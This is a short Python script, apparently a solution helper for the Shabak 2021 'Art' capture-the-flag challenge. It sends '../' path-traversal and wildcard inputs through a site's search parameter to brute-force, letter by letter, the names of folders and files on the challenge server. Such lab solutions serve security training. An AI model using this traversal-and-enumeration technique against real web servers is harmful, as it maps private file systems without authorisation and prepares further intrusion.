""" This is a solution helper for the Shabak 2021 Art challenge.

* This helper is not performance optimized, but it can help you within a reasonable time. *
"""

from requests import get
import string
import time

folders = []
files = []

brute_letters = string.printable


def brute_folders(value):
    for a in [e for e in brute_letters if e not in [',', '*', '&', '?', '#']]:
        try:
            res = get(f'http://art.shieldchallenges.com/index.php?search={value}{a}*/*')
            if 'No images found' not in res.text:
                if value[-1] + a not in ['..', './', '//']:
                    print(value + a)
                    folders.append(value + a)
                    brute_folders(value + a)
        except:
            time.sleep(5)
            continue


def brute_files(value):
    """ Hint: you can use the question mark """
    for a in [e for e in brute_letters if e not in ['#', '&', '*', ',', '?']]:
        try:
            res = get(f'http://art.shieldchallenges.com/index.php?search={value}{a}')
            if 'No images found' not in res.text:
                if value[-1] + a not in ['..', './', '//']:
                    print(value + a)
                    files.append(value + a)
                    brute_files(value + a)
        except:
            time.sleep(5)
            continue

# Find all folders
brute_folders('../')

with open("folders.txt", 'w') as output:
    for row in folders:
        output.write(str(row) + '\n')

# Find all files
for f in folders:
    brute_files(f)

with open("file3.txt", 'w') as output:
    for row in files:
        output.write(str(row) + '\n')
